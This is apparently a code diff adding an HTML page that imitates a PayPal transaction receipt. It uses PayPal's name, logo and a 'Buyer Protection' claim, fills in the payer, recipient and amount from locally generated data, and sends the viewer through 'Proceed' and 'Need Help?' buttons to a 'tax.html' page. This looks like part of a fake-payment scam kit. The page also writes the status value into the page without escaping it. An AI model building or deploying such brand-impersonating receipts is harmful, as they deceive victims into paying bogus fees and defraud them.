@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transaction Receipt – PayPal</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "PayPal Sans", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+      background: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+    }
+
+    /* ── Card ── */
+    .pp-card {
+      background: #ffffff;
+      border-radius: 6px;
+      border: 1px solid #d9dde3;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.04);
+      width: 100%;
+      max-width: 400px;
+      overflow: hidden;
+    }
+
+    /* ── Logo Area ── */
+    .pp-logo-area {
+      padding: 2rem 2rem 1.25rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.1rem;
+    }
+
+    /* PayPal wordmark SVG */
+    .pp-logo-area svg { display: block; }
+
+    .pp-receipt-label {
+      font-size: 1.25rem;
+      font-weight: 400;
+      color: #2c2e2f;
+      margin-top: 0.9rem;
+      letter-spacing: -0.01em;
+    }
+
+    /* ── Divider ── */
+    .pp-divider {
+      border: none;
+      border-top: 1px solid #e5e9f0;
+      margin: 0 1.75rem;
+    }
+
+    /* ── Info Table ── */
+    .pp-info {
+      padding: 1.25rem 1.75rem 0.5rem;
+    }
+
+    .pp-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 0.6rem 0;
+      border-bottom: 1px solid #f0f2f5;
+      gap: 1rem;
+    }
+
+    .pp-row:last-child { border-bottom: none; }
+
+    .pp-row-label {
+      font-size: 0.82rem;
+      color: #6c7378;
+      font-weight: 400;
+      flex-shrink: 0;
+      padding-top: 1px;
+      min-width: 110px;
+    }
+
+    .pp-row-value {
+      font-size: 0.88rem;
+      color: #2c2e2f;
+      font-weight: 500;
+      text-align: right;
+      word-break: break-word;
+      flex: 1;
+    }
+
+    .pp-row-value.mono {
+      font-family: "SF Mono", "Fira Code", "Courier New", monospace;
+      font-size: 0.78rem;
+      letter-spacing: 0.02em;
+      color: #454f5b;
+    }
+
+    /* Status badge — inline text, no emoji */
+    .status-text {
+      font-size: 0.82rem;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: 3px;
+    }
+
+    .status-pending { background: #fff3cd; color: #856404; }
+    .status-paid    { background: #d4edda; color: #155724; }
+    .status-refunded { background: #f8d7da; color: #721c24; }
+
+    /* ── Amount Row ── */
+    .pp-amount-row {
+      padding: 1rem 1.75rem 1.25rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid #e5e9f0;
+      border-bottom: 1px solid #e5e9f0;
+      margin-top: 0.25rem;
+    }
+
+    .pp-amount-label {
+      font-size: 0.95rem;
+      color: #2c2e2f;
+      font-weight: 400;
+    }
+
+    .pp-amount-value {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #003087;
+      letter-spacing: -0.02em;
+    }
+
+    /* ── Actions ── */
+    .pp-actions {
+      padding: 1.5rem 1.75rem 1.25rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.65rem;
+    }
+
+    .pp-btn-proceed {
+      display: block;
+      width: 100%;
+      padding: 0.78rem 1rem;
+      background: #0070ba;
+      color: #ffffff;
+      font-family: inherit;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      text-align: center;
+      letter-spacing: 0.01em;
+      transition: background 0.15s;
+    }
+
+    .pp-btn-proceed:hover { background: #005ea6; }
+    .pp-btn-proceed:active { background: #004f8c; }
+
+    .pp-link-help {
+      display: block;
+      text-align: center;
+      font-size: 0.84rem;
+      color: #0070ba;
+      text-decoration: none;
+      cursor: pointer;
+      background: none;
+      border: none;
+      font-family: inherit;
+      padding: 0.25rem;
+      transition: color 0.15s;
+    }
+
+    .pp-link-help:hover { color: #005ea6; text-decoration: underline; }
+
+    /* ── Footer ── */
+    .pp-footer {
+      padding: 0.75rem 1.75rem 1rem;
+      text-align: center;
+    }
+
+    .pp-footer-text {
+      font-size: 0.72rem;
+      color: #9da3aa;
+      line-height: 1.6;
+    }
+
+    .pp-footer-text a {
+      color: #0070ba;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="pp-card">
+
+    <!-- Logo -->
+    <div class="pp-logo-area">
+      <!-- PayPal official wordmark SVG (accurate two-tone P + wordmark) -->
+      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="26" viewBox="0 0 124 33" fill="none" aria-label="PayPal">
+        <!-- Two overlapping "P" marks -->
+        <path d="M18.571 6.113c-.428-2.783-2.924-4.6-6.49-4.6H4.826C4.3 1.513 3.86 1.9 3.78 2.42L1.013 19.973c-.06.386.24.734.63.734h4.593l1.154-7.325-.036.228c.08-.52.515-.907 1.04-.907h2.168c4.254 0 7.587-1.729 8.562-6.728.029-.147.054-.291.075-.432-.122-.065-.122-.065 0 0 .117-.748.117-1.254-.047-1.84" fill="#009cde"/>
+        <path d="M18.571 6.113c-.16.98-.472 1.886-.932 2.698-1.138 1.954-3.207 2.966-5.985 2.966H9.496c-.525 0-.96.387-1.04.907l-1.218 7.733-.345 2.189c-.052.33.203.628.537.628h3.775c.46 0 .847-.334.919-.789l.038-.196.729-4.624.047-.254c.072-.455.46-.789.92-.789h.579c3.753 0 6.69-1.525 7.549-5.936.358-1.84.173-3.375-.773-4.455-.287-.326-.628-.598-1.042-.826-.143-.082-.143-.082 0 0" fill="#003087"/>
+        <path d="M17.496 5.682a7.63 7.63 0 0 0-.938-.208 11.9 11.9 0 0 0-1.885-.137h-5.71c-.46 0-.847.334-.92.789l-1.215 7.703-.035.228c.08-.52.515-.907 1.04-.907h2.168c4.254 0 7.587-1.729 8.562-6.728.029-.147.054-.291.075-.432a6.34 6.34 0 0 0-.972-.277c-.063-.013-.063-.013 0 0" fill="#012169"/>
+        <!-- Wordmark "PayPal" -->
+        <path d="M37.37 8.4h-4.03c-.277 0-.513.198-.558.471l-1.63 10.33c-.033.21.13.4.343.4h1.925c.277 0 .513-.198.558-.471l.44-2.785c.044-.273.28-.471.558-.471h1.276c2.656 0 4.185-1.285 4.584-3.831.18-1.113.007-1.988-.516-2.6-.575-.672-1.593-1.043-2.95-1.043zm.465 3.773c-.22 1.44-1.323 1.44-2.39 1.44h-.607l.426-2.698c.025-.16.166-.278.33-.278h.278c.727 0 1.413 0 1.767.414.212.247.277.614.196 1.122zM49.17 12.14h-1.934c-.163 0-.305.117-.33.278l-.085.537-.134-.195c-.417-.605-1.346-.807-2.274-.807-2.128 0-3.946 1.611-4.3 3.872-.184 1.128.078 2.206.717 2.958.588.69 1.428 1.034 2.428 1.034 1.715 0 2.666-1.102 2.666-1.102l-.086.534c-.033.21.13.4.343.4h1.74c.277 0 .512-.198.557-.471l1.044-6.616c.034-.21-.13-.4-.342-.4zm-2.69 3.747c-.186 1.1-1.056 1.839-2.17 1.839-.558 0-1.005-.18-1.291-.52-.284-.337-.39-.817-.3-1.351.173-1.09 1.057-1.853 2.154-1.853.546 0 .99.181 1.282.525.294.347.408.831.325 1.36zM58.72 12.14h-1.942a.56.56 0 0 0-.462.245l-2.667 3.927-1.13-3.774a.558.558 0 0 0-.535-.398h-1.908c-.235 0-.4.231-.326.452l2.13 6.251-2.005 2.826c-.16.226.002.536.278.536h1.94c.181 0 .35-.088.454-.237l6.447-9.306c.157-.225-.004-.522-.274-.522z" fill="#003087"/>
+        <path d="M66.85 8.4h-4.03c-.277 0-.513.198-.558.471l-1.63 10.33c-.033.21.13.4.343.4h2.07c.194 0 .36-.14.39-.333l.463-2.923c.044-.273.28-.471.558-.471h1.276c2.656 0 4.185-1.285 4.584-3.831.18-1.113.007-1.988-.516-2.6-.575-.672-1.593-1.043-2.95-1.043zm.465 3.773c-.22 1.44-1.323 1.44-2.39 1.44h-.607l.426-2.698c.025-.16.166-.278.33-.278h.278c.727 0 1.413 0 1.767.414.212.247.277.614.196 1.122zM78.65 12.14h-1.934c-.163 0-.305.117-.33.278l-.085.537-.134-.195c-.417-.605-1.346-.807-2.274-.807-2.128 0-3.946 1.611-4.3 3.872-.184 1.128.078 2.206.717 2.958.588.69 1.428 1.034 2.428 1.034 1.715 0 2.666-1.102 2.666-1.102l-.086.534c-.033.21.13.4.343.4h1.74c.277 0 .512-.198.557-.471l1.044-6.616c.034-.21-.13-.4-.342-.4zm-2.69 3.747c-.186 1.1-1.056 1.839-2.17 1.839-.558 0-1.005-.18-1.291-.52-.284-.337-.39-.817-.3-1.351.173-1.09 1.057-1.853 2.154-1.853.546 0 .99.181 1.282.525.294.347.408.831.325 1.36zM81.49 8.65l-1.654 10.52c-.033.21.13.4.343.4h1.665c.277 0 .513-.198.558-.471l1.633-10.33c.033-.21-.13-.4-.343-.4h-1.86a.338.338 0 0 0-.342.281z" fill="#009cde"/>
+      </svg>
+
+      <p class="pp-receipt-label">Transaction Receipt</p>
+    </div>
+
+    <hr class="pp-divider">
+
+    <!-- Info Rows -->
+    <div class="pp-info">
+      <div class="pp-row">
+        <span class="pp-row-label">Transaction ID</span>
+        <span class="pp-row-value mono" id="txId">—</span>
+      </div>
+      <div class="pp-row">
+        <span class="pp-row-label">Payer Name</span>
+        <span class="pp-row-value" id="payerName">—</span>
+      </div>
+      <div class="pp-row">
+        <span class="pp-row-label">Payer Email</span>
+        <span class="pp-row-value" id="payerEmail" style="font-size:0.82rem;">—</span>
+      </div>
+      <div class="pp-row">
+        <span class="pp-row-label">Recipient Name</span>
+        <span class="pp-row-value" id="recipientName">—</span>
+      </div>
+      <div class="pp-row">
+        <span class="pp-row-label">Payment Status</span>
+        <span class="pp-row-value" id="paymentStatus">—</span>
+      </div>
+    </div>
+
+    <!-- Amount -->
+    <div class="pp-amount-row">
+      <span class="pp-amount-label">Amount</span>
+      <span class="pp-amount-value" id="amount">—</span>
+    </div>
+
+    <!-- Actions -->
+    <div class="pp-actions">
+      <button class="pp-btn-proceed" onclick="goToTax()">Proceed</button>
+      <button class="pp-link-help" onclick="window.location.href='tax.html'">Need Help?</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="pp-footer">
+      <p class="pp-footer-text">
+        This transaction is protected by PayPal's Buyer Protection.<br>
+        <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Legal Agreements</a>
+      </p>
+    </div>
+
+  </div>
+
+  <script src="app.js"></script>
+  <script>
+    function renderReceipt() {
+      const data = getReceiptData();
+      const currency = data.currency || '$';
+      const totals = calculateReceiptTotals(data);
+
+      document.getElementById('txId').textContent = data.orderId || '—';
+      document.getElementById('payerName').textContent = data.merchant.name || '—';
+      document.getElementById('payerEmail').textContent = data.merchant.email || '—';
+      document.getElementById('recipientName').textContent = data.recipient.name || '—';
+      document.getElementById('amount').textContent = formatMoney(totals.grandTotal, currency);
+
+      const s = (data.status || 'pending').toLowerCase();
+      const cls = s === 'paid' ? 'status-paid' : s === 'refunded' ? 'status-refunded' : 'status-pending';
+      document.getElementById('paymentStatus').innerHTML =
+        `<span class="status-text ${cls}">${data.status || 'Pending'}</span>`;
+    }
+
+    function goToTax() { window.location.href = 'tax.html'; }
+
+    document.addEventListener('DOMContentLoaded', renderReceipt);
+    window.addEventListener('storage', e => { if (e.key === RECEIPT_STORAGE_KEY) renderReceipt(); });
+    window.addEventListener('receiptDataUpdated', renderReceipt);
+  </script>
+</body>
+</html>
